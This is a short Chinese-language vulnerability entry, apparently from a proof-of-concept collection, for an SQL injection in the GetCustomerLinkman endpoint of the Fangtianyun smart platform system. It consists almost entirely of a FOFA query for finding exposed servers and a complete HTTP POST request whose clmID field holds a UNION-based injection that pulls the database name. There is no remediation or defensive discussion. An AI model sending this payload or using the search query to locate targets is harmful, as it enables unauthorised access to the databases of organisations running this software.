 # 方天云智慧平台系统GetCustomerLinkman存在sql注入漏洞



## fofa

```yaml
body="AjaxMethods.asmx/GetCompanyItem"
```

## poc

```
POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1
Host: ip
Cookie: ASP.NET_SessionId=pb453i5abddajnqakas2ax1e
Content-Type: application/json
Content-Length: 300

{clmID:"1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(122)+CHAR(106)+CHAR(113)+IS NULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(122)+CHAR(113),NULL,NULL-- OSZH"}
```

